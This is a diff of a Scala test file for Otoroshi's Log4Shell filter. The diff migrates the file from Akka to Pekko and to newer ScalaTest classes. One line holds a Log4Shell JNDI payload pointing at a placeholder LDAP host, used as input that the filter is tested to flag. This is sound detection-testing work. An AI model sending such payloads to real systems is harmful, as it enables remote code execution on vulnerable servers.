@@ -1,17 +1,17 @@
 package functional
 
-import akka.actor.ActorSystem
-import akka.http.scaladsl.Http
-import akka.http.scaladsl.model.{HttpMethods, HttpRequest}
-import akka.stream.Materializer
-import akka.util.ByteString
+import org.apache.pekko.actor.ActorSystem
+import org.apache.pekko.http.scaladsl.Http
+import org.apache.pekko.http.scaladsl.model.{HttpMethods, HttpRequest}
+import org.apache.pekko.stream.Materializer
+import org.apache.pekko.util.ByteString
 import org.scalatest.concurrent.{IntegrationPatience, ScalaFutures}
-import org.scalatest.{MustMatchers, OptionValues, WordSpec}
+import org.scalatest.{OptionValues}
 import otoroshi.plugins.log4j.Log4jExpressionParser
 import otoroshi.utils.syntax.implicits.BetterJsValue
 import play.api.libs.json.{JsArray, JsObject, Json}
 
-class Log4ShellSpec extends WordSpec with MustMatchers with OptionValues with ScalaFutures with IntegrationPatience {
+class Log4ShellSpec extends org.scalatest.wordspec.AnyWordSpec with org.scalatest.matchers.must.Matchers with OptionValues with ScalaFutures with IntegrationPatience {
   "Log4ShellFilter" should {
     "find bad headers" in {
       Log4jExpressionParser.parseAsExp("'${jndi:ldap://foo.bar/a}").hasJndi.mustBe(true)
@@ -29,9 +29,9 @@ class Log4ShellSpec extends WordSpec with MustMatchers with OptionValues with Sc
         .mustBe(true)
     }
     "find lot of bad headers" in {
-      implicit val system = ActorSystem()
-      implicit val ec     = system.dispatcher
-      implicit val mat    = Materializer(system)
+      implicit val system: org.apache.pekko.actor.ActorSystem = ActorSystem()
+      implicit val ec: scala.concurrent.ExecutionContext = system.dispatcher
+      implicit val mat: org.apache.pekko.stream.Materializer = Materializer(system)
       val http            = Http()
       http
         .singleRequest(
